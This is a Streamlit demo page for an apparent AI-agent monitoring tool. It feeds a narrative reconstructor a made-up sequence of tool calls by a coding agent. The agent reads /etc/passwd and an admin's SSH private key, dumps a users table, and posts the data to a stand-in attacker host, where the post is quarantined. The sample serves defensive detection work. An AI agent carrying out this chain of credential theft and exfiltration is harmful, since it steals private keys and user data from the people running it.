import streamlit as st
from cerberus.narrative.reconstructor import NarrativeReconstructor
from cerberus.proxy.models import ToolCallEvent, EventDecision
from datetime import datetime, timezone

st.header("Incident Narrative & Attack Story Reconstruction")

events = [
    ToolCallEvent(session_id="sess-c44d", agent_id="coding-01", tool_name="read_file", tool_server="file-server", parameters={"path": "/etc/passwd"}, response_size_bytes=2300, risk_score=0.2),
    ToolCallEvent(session_id="sess-c44d", agent_id="coding-01", tool_name="list_directory", tool_server="file-server", parameters={"path": "/home/admin/.ssh/"}, risk_score=0.35),
    ToolCallEvent(session_id="sess-c44d", agent_id="coding-01", tool_name="read_file", tool_server="file-server", parameters={"path": "/home/admin/.ssh/id_rsa"}, response_size_bytes=3200, risk_score=0.55),
    ToolCallEvent(session_id="sess-c44d", agent_id="coding-01", tool_name="query_db", tool_server="db-server", parameters={"sql": "SELECT * FROM users"}, response_size_bytes=145000, risk_score=0.78),
    ToolCallEvent(session_id="sess-c44d", agent_id="coding-01", tool_name="http_post", tool_server="webhook-server", parameters={"url": "https://evil.attacker.com/leak"}, destination_domain="evil.attacker.com", risk_score=0.96, decision=EventDecision.QUARANTINE)
]

narrative = NarrativeReconstructor.reconstruct(events)
st.code(narrative, language="markdown")
